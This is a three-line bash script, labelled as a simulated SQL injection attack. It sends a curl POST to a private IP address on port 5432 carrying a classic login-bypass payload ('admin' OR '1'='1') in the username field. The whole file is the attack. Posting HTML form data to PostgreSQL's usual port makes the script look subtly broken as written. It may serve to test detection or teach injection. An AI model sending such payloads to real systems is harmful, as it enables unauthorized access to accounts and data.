#!/bin/bash
# Simulate SQL Injection attack
curl -X POST http://10.16.3.61:5432 -d "username=admin' OR '1'='1&password=anything"

